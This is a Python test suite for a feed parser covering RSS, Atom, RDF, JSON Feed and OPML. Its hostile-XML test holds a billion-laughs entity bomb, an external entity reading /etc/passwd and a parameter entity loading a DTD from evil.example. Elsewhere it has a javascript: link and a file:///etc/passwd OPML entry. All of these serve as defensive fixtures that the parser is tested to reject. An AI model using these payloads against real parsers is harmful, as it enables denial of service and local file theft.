"""Feed parsing: RSS 2.0, RSS 1.0, Atom and JSON Feed, item identity, dates, encodings,
and refusal of hostile XML. The system Python on macOS links an old expat without entity
amplification limits, so entity declarations and DTD internal subsets are refused outright
and nothing external is ever loaded. Run with /usr/bin/python3 too. Fixtures are generated.
"""

import json
from pathlib import Path
import sys
import time

TESTS = Path(__file__).resolve().parent
sys.path.insert(0, str(TESTS.parent / "native"))
import feeds

RSS = b"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"
  xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
  <title>Slow Reading &amp; Notes</title>
  <link>https://blog.example/</link>
  <ttl>120</ttl>
  <item>
    <title>First &lt;b&gt;post&lt;/b&gt;</title>
    <link>/posts/1?utm_source=rss&amp;id=7#comments</link>
    <guid isPermaLink="false">post-1</guid>
    <pubDate>Tue, 03 Jun 2025 09:30:00 +0800</pubDate>
    <dc:creator>Ada</dc:creator>
    <description>A &lt;em&gt;short&lt;/em&gt; summary.</description>
    <content:encoded><![CDATA[<p>The whole text, with <a href="/x">a link</a>.</p>]]></content:encoded>
    <media:thumbnail url="https://blog.example/1.jpg"/>
  </item>
  <item>
    <title>Second</title>
    <guid>https://blog.example/posts/2</guid>
    <description>Only a summary.</description>
  </item>
</channel>
</rss>"""


def test_rss():
    feed = feeds.parse(RSS, "application/rss+xml", "https://blog.example/feed.xml")
    assert feed["kind"] == "rss" and feed["title"] == "Slow Reading & Notes", feed
    assert feed["siteUrl"] == "https://blog.example/" and feed["ttl"] == 120
    first, second = feed["items"]
    assert first["key"] == "post-1"
    assert first["link"] == "https://blog.example/posts/1?utm_source=rss&id=7#comments"
    # The vault identity drops tracking parameters and the fragment.
    assert first["url"] == "https://blog.example/posts/1?id=7", first["url"]
    assert first["title"] == "First post" and first["author"] == "Ada"
    assert first["publishedAt"] == "2025-06-03T01:30:00+00:00", first["publishedAt"]
    assert first["summary"] == "A short summary."
    assert '<a href="/x">a link</a>' in first["contentHtml"]
    assert first["image"] == "https://blog.example/1.jpg"
    # A guid without isPermaLink="false" is the link when there is no <link>.
    assert (
        second["link"] == "https://blog.example/posts/2"
        and second["key"] == second["link"]
    )
    assert second["contentKind"] == "summary" and second["publishedAt"] is None


def test_atom_and_rdf():
    atom = b"""<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://atom.example/blog/">
  <title type="html">Atom &amp;lt;Notes&amp;gt;</title>
  <link href="https://atom.example/"/>
  <link rel="self" href="https://atom.example/feed"/>
  <author><name>Grace</name></author>
  <entry>
    <id>tag:atom.example,2025:1</id>
    <title>Entry</title>
    <link rel="alternate" href="entry-1"/>
    <updated>2025-06-01T12:00:00Z</updated>
    <content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml"><p>Hello <b>x</b> &amp; y<br/>z</p></div></content>
  </entry>
</feed>"""
    feed = feeds.parse(atom, "", "https://atom.example/feed")
    assert feed["kind"] == "atom" and feed["title"] == "Atom <Notes>", feed["title"]
    entry = feed["items"][0]
    assert entry["link"] == "https://atom.example/blog/entry-1", entry["link"]
    assert (
        entry["author"] == "Grace"
        and entry["publishedAt"] == "2025-06-01T12:00:00+00:00"
    )
    assert entry["contentHtml"] == "<p>Hello <b>x</b> &amp; y<br>z</p>", entry[
        "contentHtml"
    ]

    rdf = b"""<?xml version="1.0"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
  xmlns="http://purl.org/rss/1.0/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel rdf:about="https://rdf.example/"><title>RDF</title><link>https://rdf.example/</link></channel>
  <item rdf:about="https://rdf.example/a"><title>A</title><link>https://rdf.example/a</link>
    <dc:date>2025-05-01</dc:date></item>
</rdf:RDF>"""
    feed = feeds.parse(rdf, "", "https://rdf.example/rss")
    assert feed["kind"] == "rdf" and feed["title"] == "RDF"
    assert feed["items"][0]["publishedAt"] == "2025-05-01T00:00:00+00:00"


def test_json_feed():
    data = {
        "version": "https://jsonfeed.org/version/1.1",
        "title": "JSON",
        "home_page_url": "https://json.example/",
        "items": [
            {
                "id": "1",
                "url": "https://json.example/1",
                "title": "One",
                "content_text": "plain <text>",
                "date_published": "2025-06-02T08:00:00+02:00",
                "authors": [{"name": "Lin"}],
            },
            "not an item",
        ],
    }
    feed = feeds.parse(json.dumps(data).encode(), "application/feed+json", "")
    assert feed["kind"] == "json" and len(feed["items"]) == 1
    item = feed["items"][0]
    assert item["contentHtml"] == "plain &lt;text&gt;" and item["author"] == "Lin"
    assert item["publishedAt"] == "2025-06-02T06:00:00+00:00"
    for bad in (b"{}", b'{"version": "1", "items": []}', b"[1, 2]"):
        expect_error(lambda: feeds.parse(bad), "JSON")
    nested = (
        b'{"version": "https://jsonfeed.org/version/1", "items": '
        + b"[" * 150
        + b"]" * 150
        + b"}"
    )
    expect_error(lambda: feeds.parse(nested), "nested")


def expect_error(action, text):
    try:
        action()
    except feeds.FeedError as error:
        assert text.lower() in str(error).lower(), (text, str(error))
        return
    raise AssertionError(f"expected a FeedError about {text}")


def test_hostile_xml():
    laughs = b"""<?xml version="1.0"?>
<!DOCTYPE rss [
<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<rss><channel><title>&d;</title></channel></rss>"""
    started = time.monotonic()
    expect_error(lambda: feeds.parse(laughs), "internal subset")
    assert time.monotonic() - started < 1
    external = b"""<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
<rss><channel><title>&secret;</title></channel></rss>"""
    expect_error(lambda: feeds.parse(external), "internal subset")
    parameter = b"""<?xml version="1.0"?>
<!DOCTYPE rss SYSTEM "https://evil.example/x.dtd" [<!ENTITY % p SYSTEM "https://evil.example/p">%p;]>
<rss><channel><title>t</title></channel></rss>"""
    expect_error(lambda: feeds.parse(parameter), "")
    # RSS 0.91's external DOCTYPE is fine: it is never loaded, and &nbsp; still reads.
    netscape = b"""<?xml version="1.0"?>
<!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN"
  "http://my.netscape.com/publish/formats/rss-0.91.dtd">
<rss version="0.91"><channel><title>Old&nbsp;feed &eacute;t&eacute;</title>
<item><title>A&hellip;</title><link>https://old.example/a</link></item></channel></rss>"""
    feed = feeds.parse(netscape, "", "https://old.example/rss")
    assert feed["title"] == "Old feed été", feed["title"]
    assert feed["items"][0]["title"] == "A…"
    # Without a DOCTYPE, an HTML entity is an undefined entity; it is read on a second pass.
    plain = (
        b"<rss><channel><title>A&nbsp;B&mdash;C &amp; &unknown;</title></channel></rss>"
    )
    try:
        feeds.parse(plain)
    except feeds.FeedError as error:
        assert "undefined entity" in str(error), error
    plain = b"<rss><channel><title>A&nbsp;B&mdash;C &amp; D</title></channel></rss>"
    assert feeds.parse(plain)["title"] == "A B—C & D"


def test_limits_and_encodings():
    expect_error(lambda: feeds.parse(b" " * (feeds.FEED_LIMIT + 1)), "larger")
    many = (
        b"<rss><channel>" + b"<item/>" * (feeds.ELEMENT_LIMIT + 1) + b"</channel></rss>"
    )
    expect_error(lambda: feeds.parse(many), "too many")
    # Tens of thousands of siblings separated by text: parsing stays linear.
    started = time.monotonic()
    wide = b"<rss><channel><title>t</title>" + b"<x/>\n" * 90_000 + b"</channel></rss>"
    assert feeds.parse(wide)["title"] == "t"
    assert time.monotonic() - started < 5, time.monotonic() - started
    deep = b"<rss>" + b"<a>" * 200 + b"</a>" * 200 + b"</rss>"
    expect_error(lambda: feeds.parse(deep), "nested")
    expect_error(lambda: feeds.parse(b"<html><body>no</body></html>"), "Not an RSS")
    expect_error(lambda: feeds.parse(b"<rss><channel>"), "valid")
    items = b"".join(b"<item><guid>%d</guid></item>" % n for n in range(300))
    feed = feeds.parse(b"<rss><channel><title>t</title>" + items + b"</channel></rss>")
    assert len(feed["items"]) == feeds.ITEM_LIMIT
    # GBK declared in the XML, and GB2312 declared only by the server.
    text = "<?xml version='1.0' encoding='gbk'?><rss><channel><title>中文订阅</title></channel></rss>"
    assert feeds.parse(text.encode("gbk"))["title"] == "中文订阅"
    text = "<rss><channel><title>简体标题</title></channel></rss>"
    assert (
        feeds.parse(text.encode("gb2312"), "text/xml; charset=GB2312")["title"]
        == "简体标题"
    )
    text = "﻿<rss><channel><title>BOM</title></channel></rss>"
    assert feeds.parse(text.encode("utf-16"))["title"] == "BOM"


def test_keys_and_dates():
    no_ids = b"""<rss><channel>
<item><title>Untitled day</title><description>Same text</description></item>
<item><title>Untitled day</title><description>Same text</description></item>
<item><title>Other</title><link>javascript:alert(1)</link></item>
</channel></rss>"""
    one, two, three = feeds.parse(no_ids)["items"]
    assert one["key"].startswith("sha256:") and one["key"] == two["key"]
    assert three["link"] == "" and three["key"] != one["key"]
    assert feeds._date("Mon, 02 Jun 2025 10:00:00 GMT") == "2025-06-02T10:00:00+00:00"
    assert (
        feeds._date("2025-06-02T10:00:00.123456789-0500") == "2025-06-02T15:00:00+00:00"
    )
    assert feeds._date("2025-06-02 10:00") == "2025-06-02T10:00:00+00:00"
    assert feeds._date("yesterday") is None and feeds._date("") is None
    assert (
        feeds.identity("https://a.example/p?a=1&utm_medium=x&fbclid=y#f")
        == "https://a.example/p?a=1"
    )
    # Other parameters stay exactly as written.
    assert (
        feeds.identity("https://a.example/p?a&b=%20+c&UTM_Source=x&d=%2F")
        == "https://a.example/p?a&b=%20+c&d=%2F"
    )


def test_opml():
    text = """<?xml version="1.0"?>
<opml version="2.0"><head><title>Mine</title></head><body>
  <outline text="Tech">
    <outline type="rss" text="Blog A" xmlUrl="https://a.example/feed" htmlUrl="https://a.example/"/>
    <outline text="Nested"><outline text="B" xmlUrl="https://b.example/rss"/></outline>
  </outline>
  <outline text="Loose" xmlUrl="https://c.example/atom.xml"/>
  <outline text="Bad" xmlUrl="file:///etc/passwd"/>
</body></opml>"""
    outlines = feeds.parse_opml(text)
    assert [o["url"] for o in outlines] == [
        "https://a.example/feed",
        "https://b.example/rss",
        "https://c.example/atom.xml",
    ], outlines
    assert outlines[0] == {
        "url": "https://a.example/feed",
        "title": "Blog A",
        "siteUrl": "https://a.example/",
        "category": "Tech",
    }
    assert outlines[1]["category"] == "Nested" and outlines[2]["category"] == ""
    expect_error(lambda: feeds.parse_opml("<!DOCTYPE x [<!ENTITY a 'b'>]><opml/>"), "")


for test in [
    test_rss,
    test_atom_and_rdf,
    test_json_feed,
    test_hostile_xml,
    test_limits_and_encodings,
    test_keys_and_dates,
    test_opml,
]:
    test()
print("feeds-parse: ok")
